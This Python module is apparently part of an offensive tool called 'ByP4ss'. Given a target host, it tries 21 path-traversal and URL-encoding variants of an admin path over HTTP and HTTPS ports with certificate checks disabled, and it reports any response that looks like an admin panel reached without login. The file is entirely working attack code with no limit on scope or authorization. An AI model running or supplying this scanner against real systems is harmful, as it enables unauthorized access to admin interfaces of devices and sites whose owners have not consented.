# HttpAuth do ByP4ss
# Testa bypass de auth HTTP via path traversal
# Procura rotas que respondem 200 sem exigir login

import urllib.request
import urllib.error
import ssl
import re

from Core.Constants import Constants
from Core.Config import Config
from Core.Log import Log


class HttpAuth:

    @staticmethod
    def _ContextoSsl():
        Ctx = ssl.create_default_context()
        Ctx.check_hostname = False
        Ctx.verify_mode = ssl.CERT_NONE
        return Ctx

    @staticmethod
    def _Fetch(Url, Timeout=None, Metodo="GET", Headers=None):
        Timeout = Timeout or Config.TimeoutHTTP
        Headers = Headers or {
            "User-Agent": Constants.HTTP_HEADERS_PADRAO["User-Agent"],
            "Accept": "*/*",
            "Connection": "close",
        }
        try:
            Req = urllib.request.Request(Url, headers=Headers, method=Metodo)
            Ctx = HttpAuth._ContextoSsl()
            with urllib.request.urlopen(Req, timeout=Timeout, context=Ctx) as F:
                Corpo = F.read(8192).decode("utf-8", errors="replace")
                return {
                    "ok": True,
                    "status": F.status,
                    "headers": dict(F.headers),
                    "corpo": Corpo,
                    "url_final": F.url,
                }
        except urllib.error.HTTPError as E:
            Corpo = E.read(8192).decode("utf-8", errors="replace") if hasattr(E, "read") else ""
            return {
                "ok": False,
                "status": E.code,
                "headers": dict(E.headers) if E.headers else {},
                "corpo": Corpo,
                "url_final": E.url,
            }
        except Exception as E:
            return {"ok": False, "erro": str(E), "status": 0}

    @staticmethod
    def _BaseUrls(Alvo):
        return [
            f"https://{Alvo}",
            f"http://{Alvo}",
            f"https://{Alvo}:8443",
            f"http://{Alvo}:8080",
        ]

    @staticmethod
    def _PathBase(Alvo):
        return "/"

    @staticmethod
    def _GerarVariacoes(Caminho):
        Base = Caminho.rstrip("/")
        Variacoes = [
            f"{Base}",
            f"{Base}/",
            f"{Base}/.",
            f"{Base}/..",
            f"{Base}/../{Base.lstrip('/')}",
            f"{Base}/./{Base.lstrip('/')}",
            f"{Base}/%2e%2e{Base}",
            f"{Base}/.;/",
            f"{Base}/..;/",
            f"{Base}/..%2f{Base.lstrip('/')}",
            f"{Base}/%2e%2e%2f{Base.lstrip('/')}",
            f"/./{Base.lstrip('/')}",
            f"/.//{Base.lstrip('/')}",
            f"//{Base.lstrip('/')}",
            f"///{Base.lstrip('/')}",
            f"/%2e/{Base.lstrip('/')}",
            f"{Base}%00",
            f"{Base}%20",
            f"{Base}%09",
            f"{Base}?",
            f"{Base}#",
        ]
        Vistos = set()
        Unicos = []
        for V in Variacoes:
            if V not in Vistos:
                Vistos.add(V)
                Unicos.append(V)
        return Unicos

    @staticmethod
    def _PareceLogin(Resposta):
        if not Resposta.get("ok"):
            return False
        Status = Resposta.get("status", 0)
        if Status in (401, 403):
            return True
        if Status == 200:
            Corpo = Resposta.get("corpo", "").lower()
            PalavrasLogin = [
                "login", "username", "password", "signin", "sign-in",
                "authenticate", "log in", "passwd", "usuario", "senha",
                "type=\"password\"", "name=\"user", "name=\"pass",
            ]
            for Palavra in PalavrasLogin:
                if Palavra in Corpo:
                    return True
        return False

    @staticmethod
    def _ParecePainel(Resposta):
        if not Resposta.get("ok"):
            return False
        if Resposta.get("status") != 200:
            return False
        Corpo = Resposta.get("corpo", "").lower()
        PalavrasPainel = [
            "<title>admin", "<title>painel", "<title>dashboard",
            "configura", "advanced", "system", "network",
            "logout", "logoff", "sair", "menu",
        ]
        for Palavra in PalavrasPainel:
            if Palavra in Corpo:
                return True
        return False

    @staticmethod
    def TestarTraversal(Alvo, Caminho="/admin"):
        Log.Info("httpauth iniciado", {"alvo": Alvo, "caminho": Caminho})

        Resultado = {
            "ok": False,
            "alvo": Alvo,
            "caminho_base": Caminho,
            "testados": 0,
            "achados": [],
            "motivo": "",
        }

        Bases = HttpAuth._BaseUrls(Alvo)
        Variacoes = HttpAuth._GerarVariacoes(Caminho)

        for Base in Bases:
            BaseResult = HttpAuth._Fetch(Base + "/")
            if not BaseResult.get("ok"):
                continue

            Resultado["testados"] += 1

            if HttpAuth._ParecePainel(BaseResult):
                Resultado["achados"].append({
                    "url": Base + "/",
                    "tipo": "painel_sem_auth",
                    "status": BaseResult.get("status"),
                })
                Resultado["ok"] = True
                Log.Bypass("HttpAuth", Alvo, True, {
                    "url": Base + "/",
                    "tipo": "painel_sem_auth",
                })
                continue

            for Variacao in Variacoes:
                Url = Base + Variacao
                Resp = HttpAuth._Fetch(Url)
                Resultado["testados"] += 1

                if HttpAuth._ParecePainel(Resp) and not HttpAuth._PareceLogin(Resp):
                    Resultado["achados"].append({
                        "url": Url,
                        "tipo": "path_traversal",
                        "status": Resp.get("status"),
                        "variacao": Variacao,
                    })
                    Resultado["ok"] = True
                    Log.Bypass("HttpAuth", Alvo, True, {
                        "url": Url,
                        "variacao": Variacao,
                    })

        if not Resultado["ok"]:
            Resultado["motivo"] = "nenhum_bypass"

        Log.Info("httpauth concluido", {
            "achados": len(Resultado["achados"]),
            "testados": Resultado["testados"],
        })
        return Resultado

    @staticmethod
    def Info():
        return {
            "nome": "HttpAuth",
            "variacoes": 21,
            "timeout": Config.TimeoutHTTP,
        }
